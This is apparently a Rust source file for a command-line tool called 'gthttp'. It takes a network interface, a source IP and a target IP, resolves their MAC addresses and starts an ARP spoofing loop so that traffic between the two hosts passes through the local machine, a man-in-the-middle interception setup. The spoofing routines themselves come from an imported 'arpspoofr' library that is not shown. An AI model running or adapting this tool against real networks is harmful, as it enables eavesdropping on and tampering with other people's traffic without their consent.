extern crate clap;
extern crate ctrlc;
extern crate arpspoofr;

pub mod util;

use util::*;

use arpspoofr::*;

use std::net::{IpAddr, Ipv4Addr};
use std::thread;
use std::sync::Arc;
use clap::{App, Arg};

use pnet::datalink::MacAddr;

struct Arguments {
    interface: String,
    source_ip: Ipv4Addr,
    target_ip: Ipv4Addr,
}

fn parse_args() -> Arguments {
    let args = App::new("gthttp")
        .arg(Arg::with_name("interface")
             .value_name("INTERFACE")
             .required(true)
             .help("Network interface on which to intercept traffic"))
        .arg(Arg::with_name("source_ip")
             .value_name("SOURCE_IP")
             .required(true)
             .help("Source IPv4 Address"))
        .arg(Arg::with_name("target_ip")
             .value_name("TARGET_IP")
             .required(true)
             .help("Target IPv4 Address"))
        .get_matches();

    let (iface, source_ip, target_ip) = {
        let iface = args.value_of("interface").unwrap().into();
        let sip = match args.value_of("source_ip").unwrap().parse().unwrap() {
            IpAddr::V4(v4) => v4,
            _ => panic!("source_ip is not a valid IPv4 address")
        };

        let tip = match args.value_of("target_ip").unwrap().parse().unwrap() {
            IpAddr::V4(v4) => v4,
            _ => panic!("target_ip is not a valid IPv4 address")
        };

        (iface, sip, tip)
    };

    Arguments {
        interface: iface,
        source_ip: source_ip,
        target_ip: target_ip
    }
}

struct GthttpCtx {
    interface: String,
    local_ip: Ipv4Addr,
    local_mac: MacAddr,
    source_ip: Ipv4Addr,
    source_mac: MacAddr,
    target_ip: Ipv4Addr,
    target_mac: MacAddr,
}

fn collect_target_info() -> GthttpCtx {
    let args = parse_args();

    // TODO: handle case where interface is not valid
    let (mut tx, mut rx, iface) = open_interface(&args.interface);

    let local_mac = iface.mac_address();
    let local_ip = iface.ips.first().unwrap().ip();
    let local_ipv4 = match local_ip {
        IpAddr::V4(local_ipv4) => local_ipv4,
        _ => panic!("You don't have an IPv4 address I guess?")
    };

    // Lookup mac for source and target
    let source_mac = lookup_arp(&mut *tx, &mut *rx, local_ipv4, local_mac, args.source_ip);
    let target_mac = lookup_arp(&mut *tx, &mut *rx, local_ipv4, local_mac, args.target_ip);

    GthttpCtx {
        interface: args.interface,
        local_ip: local_ipv4,
        local_mac: local_mac,
        source_ip: args.source_ip,
        source_mac: source_mac,
        target_ip: args.target_ip,
        target_mac: target_mac,
    }
}

fn main() {
    let ctx = Arc::new(collect_target_info());

    println!("My IP: {}", ctx.local_ip);
    println!("Source MAC: {}", ctx.source_mac);
    println!("Target MAC: {}", ctx.target_mac);

    let ctx2 = ctx.clone();
    ctrlc::set_handler(move || {
        println!("\nReceived Ctrl+C!");
        // Borrow cause I guess that works? IDK, rust is weird
        let ctx = &ctx2;
        restore_arp_state(&ctx.interface, ctx.source_ip, ctx.source_mac,
                          ctx.target_ip, ctx.target_mac);
        std::process::exit(0);
    }).expect("Error setting Ctrl-C handler");

    // Spoof arp responses so we can receive traffic for the source and target
    let ctx1 = ctx.clone();
    let arp_spoof_thread = thread::spawn(move || {
        let ctx = ctx1;
        arp_spoof_loop(&ctx.interface, ctx.local_mac, ctx.source_ip, ctx.source_mac,
                  ctx.target_ip, ctx.target_mac);
    });

    let _res = arp_spoof_thread.join();
}
